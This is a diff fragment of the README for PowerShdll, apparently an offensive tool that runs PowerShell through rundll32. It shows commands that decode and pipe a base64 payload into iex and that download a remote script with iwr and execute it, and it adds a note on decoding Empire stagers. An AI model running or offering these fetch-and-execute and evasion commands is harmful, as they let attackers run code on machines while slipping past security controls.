@@ -26,6 +26,7 @@ PowerShdll.exe -i      Start an interactive console in this console
 ```
 rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex
 ```
+Note: Empire stagers need to be decoded using [System.Text.Encoding]::Unicode
 ### Download and run script
 ```
 rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
